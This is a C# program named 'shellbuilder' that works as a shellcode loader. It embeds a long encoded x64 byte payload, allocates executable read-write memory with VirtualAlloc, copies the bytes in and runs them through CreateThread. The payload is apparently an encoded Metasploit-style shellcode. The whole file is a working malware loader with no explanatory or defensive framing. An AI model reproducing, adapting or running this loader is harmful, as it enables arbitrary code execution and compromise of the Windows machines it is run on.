using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
/// <summary>
/// Programmer : Diljith Suresh
/// </summary>
namespace shellbuilder
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            byte[] bashellcode = new byte[] {0x48,0x31,0xc9,0x48,0x81,0xe9,0xb0,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
0xff,0xff,0x48,0xbb,0xa4,0x72,0xdb,0x25,0x58,0x98,0x1a,0x04,0x48,0x31,0x58,
0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x58,0x3a,0x58,0xc1,0xa8,0x70,
0xd6,0x04,0xa4,0x72,0x9a,0x74,0x19,0xc8,0x48,0x4c,0x95,0xa0,0xbe,0x6d,0xd3,
0xca,0x7a,0x55,0xf2,0x3a,0x50,0x77,0x40,0xd0,0x91,0x56,0x84,0x3a,0x50,0x57,
0x08,0xd0,0x15,0xb3,0xee,0x38,0x96,0x14,0x91,0xd0,0x2b,0xc4,0x08,0x4e,0xba,
0x59,0x5a,0xb4,0x3a,0x45,0x65,0xbb,0xd6,0x64,0x59,0x59,0xf8,0xe9,0xf6,0x33,
0x8a,0x6d,0xd3,0xca,0x3a,0x8f,0xe6,0x4e,0x93,0x24,0x88,0xfe,0x9b,0x7c,0xbc,
0x79,0xd9,0x2a,0xdd,0xea,0x1a,0x04,0xa4,0xf9,0x5b,0xad,0x58,0x98,0x1a,0x4c,
0x21,0xb2,0xaf,0x42,0x10,0x99,0xca,0x54,0xe0,0xf9,0x9b,0x05,0xd3,0xd0,0x02,
0x4d,0xa5,0xa2,0x38,0x73,0x10,0x67,0xd3,0x49,0x95,0xbb,0x9a,0xae,0x6c,0x10,
0x52,0x05,0x72,0x3a,0xea,0xe5,0x19,0x59,0xd3,0x09,0x08,0x33,0xda,0xe4,0x60,
0x78,0x6f,0xf5,0xe8,0x71,0x97,0x01,0x50,0xdd,0x23,0xd5,0xd1,0xaa,0x83,0x61,
0xd3,0xd8,0x3e,0x4d,0xa5,0xa2,0xbd,0x64,0xd3,0x94,0x52,0x40,0x2f,0x32,0xc7,
0x6c,0x59,0x48,0x5b,0x8f,0xa0,0xfa,0x93,0x24,0x88,0xd9,0x42,0x45,0xfc,0x2c,
0x82,0x7f,0x19,0xc0,0x5b,0x5d,0xe5,0x28,0x93,0xa6,0xb4,0xb8,0x5b,0x56,0x5b,
0x92,0x83,0x64,0x01,0xc2,0x52,0x8f,0xb6,0x9b,0x90,0xda,0xa7,0x67,0x47,0x4c,
0x95,0xa9,0x88,0x6c,0xe6,0xef,0x73,0x6a,0xcd,0x1c,0xbe,0x51,0x58,0xd9,0x4c,
0x4c,0x2d,0x93,0x92,0xe2,0x9a,0xd4,0x6d,0x22,0xa3,0x8d,0x0e,0x76,0x0b,0xd0,
0x93,0xe5,0xf7,0x28,0x96,0x14,0x98,0xd5,0x2b,0xcd,0xf7,0x21,0x92,0x9f,0x62,
0xce,0x63,0xa3,0xa4,0x72,0xdb,0x25,0xa7,0x4d,0xf2,0x09,0xa4,0x72,0xdb,0x14,
0x61,0xaa,0x34,0x35,0x92,0x4a,0xf5,0x14,0x76,0xaf,0x28,0x04,0xfe,0x3a,0x52,
0xe4,0x11,0x5f,0xda,0xbf,0xa5,0x72,0xdb,0x68,0x69,0x51,0x49,0x57,0xce,0x71,
0x88,0x6c,0xe2,0xcf,0x93,0x9b,0x62,0x72,0xdb,0x25,0x58,0x67,0xcf,0xec,0xdd,
0x72,0xdb,0x25,0x77,0xf6,0x48,0x61,0xeb,0x46,0x98,0x67,0x08,0xcd,0x57,0x40,
0xc1,0x1f,0xe2,0x08,0x02,0xee,0x2d,0x5d,0xdd,0x44,0x8a,0x53,0x1d,0xd1,0x4a,
0x4a,0xd3,0x37,0xb1,0x42,0x6f,0xc9,0x70,0x40,0xe3,0x39,0x8e,0x76,0x1c,0xf5,
0x2a,0x31,0xc9,0x15,0x96,0x5f,0x0f,0xd9,0x4a,0x76,0xf7,0x21,0xbd,0x4b,0x3d,
0xe2,0x79,0x75,0xeb,0x1d,0xb5,0x62,0x39,0xd0,0x2c,0x57,0xd3,0x02,0x8e,0x16,
0x68,0xd5,0x4a,0x69,0xee,0x1a,0xaa,0x7d,0x0f,0xa9,0x62,0x74,0xfd,0x40,0x89,
0x08,0x12,0xce,0x75,0x5d,0xe1,0x3c,0xa8,0x40,0x6c,0xfc,0x79,0x61,0xc1,0x21,
0x92,0x70,0x6b,0xf1,0x7f,0x4c,0xf2,0x03,0xb8,0x47,0x61,0xf9,0x79,0x54,0xf3,
0x1a,0xb3,0x50,0x58,0xd0,0x93,0xc5,0xf7,0x28,0x9a,0x7d,0x15,0xa9,0xd3,0x57,
0xec,0xca,0xdb,0x27,0x70,0x1c,0x1a,0x04,0xa4,0x72,0x8b,0x76,0x0b,0xd1,0xdd,
0xc6,0x4f,0x27,0xf5,0x1e,0xa7,0x4d,0x52,0x8d,0x62,0x18,0xd1,0x7a,0x0b,0xc2,
0x52,0x8d,0x55,0x3f,0xea,0xec,0x15,0xa9,0xd3,0x57,0xf7,0x3b,0x1c,0xe7,0x75,
0x9e,0x02,0x7f,0x5b,0xa7,0x5e,0xe5,0x2d,0x87,0x52,0xc3,0x65,0xfa,0xc8,0x25,
0x58,0xd1,0xa0,0x40,0x54,0x47,0x3b,0x25,0x58,0x98,0x1a,0xfb,0x71,0x3a,0x24,
0xea,0x2c,0x9a,0xf1,0xc8,0x4c,0x27,0xdb,0x25,0x58,0xcb,0x43,0x6e,0xe4,0x28,
0x92,0xac,0x89,0x59,0xf8,0x14,0xed,0xb5,0x1b,0x25,0x48,0x98,0x1a,0x4d,0x1e,
0x2a,0x7f,0x76,0xbd,0x98,0x1a,0x04,0xa4,0x8d,0x0e,0x6d,0xcb,0xcb,0x49,0x4c,
0x2d,0x95,0x93,0xac,0xa9,0xd0,0x93,0xde,0xed,0xb5,0x1b,0x25,0x78,0x98,0x1a,
0x4d,0x2d,0x8b,0x92,0x9f,0x4a,0x0e,0x93,0xe6,0xa4,0x72,0xdb,0x25,0xa7,0x4d,
0x52,0x87,0x60,0x52,0x5e,0xe5,0x2c,0x2a,0x7c,0x8f,0xa3,0x3a,0xda,0xe6,0xdd,
0x58,0x6f,0xd6,0xfc,0xb1,0x83,0x4f,0x58,0xc1,0x53,0xc3,0x66,0x82,0x6e,0x87,
0x0e,0x67,0xcf,0x04 };
            int bufsize = bashellcode.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)bufsize, 0x3000, 0x40);
            Marshal.Copy(bashellcode, 0, addr, bufsize);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
